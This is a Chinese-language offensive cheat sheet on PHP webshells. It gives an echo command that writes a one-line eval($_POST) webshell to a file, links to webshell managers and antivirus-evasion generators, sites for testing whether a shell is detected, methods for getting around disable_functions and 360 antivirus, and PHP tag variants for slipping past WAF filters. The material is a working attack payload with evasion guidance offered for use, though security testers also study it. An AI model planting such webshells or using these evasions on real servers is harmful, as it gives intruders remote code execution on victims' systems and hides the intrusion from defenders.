# 01、echo写入php一句话木马
```
echo "<?php eval(\$_POST['cmd']);?>">1.php

1.php内容如下
<?php eval($_POST['cmd']);?>
```
#### 注意
```
在burp及bash下测试发现，执行如下命令
echo "<?php eval($_POST['cmd']);?>">1.php
1.php的内容如下，并不是正确的php一句话木马
<?php eval(['cmd']);?>

windows下echo "bbb">3.txt时，会将双引号带入文件内容，linux下echo "bbb">3.txt时，不会将双引号带入文件内容。
```

# 02、webshell免杀
```
https://github.com/AntSwordProject/antSword
https://github.com/rebeyond/Behinder
https://github.com/BeichenDream/Godzilla
https://github.com/shack2/skyscorpion
https://github.com/Chora10/Cknife

https://github.com/Tas9er/ByPassBehinder4J
https://github.com/cseroad/Webshell_Generate
https://github.com/G0mini/Bypass
http://bypass.tidesec.com/web/
https://github.com/czz1233/GBByPass

https://github.com/AabyssZG/WebShell-Bypass-Guide/tree/main
```
webshell免杀效果检测
```
https://n.shellpub.com/
https://ti.aliyun.com/#/webshell
https://sandbox.dbappsecurity.com.cn/
```

# 03、webshell绕过disable_functions执行命令
```
https://github.com/mm0r1/exploits/tree/master/php-filter-bypass
```

# 04、webshell下过360执行命令
```
Webshell绕过360主动防御执行命令
https://mp.weixin.qq.com/s/OGwo1zoN1LS3aYalZ_PePw
```

# 05、针对php标签的waf绕过
```
写法1
# 标准写法
<?php echo date('Y-m-d h:m:s');?>

写法2
# 短标签，php5.4起
<? echo 1; ?>

写法3
# asp风格
<% echo 1; %>

写法4
# 长标签写法
<script language="php"> echo 1; </script>
```

# 参考
```
https://mp.weixin.qq.com/s/LK8zfWlz0s3v93sIY9DztQ【某师傅造的仿真环境，从GetShell到提权root】
```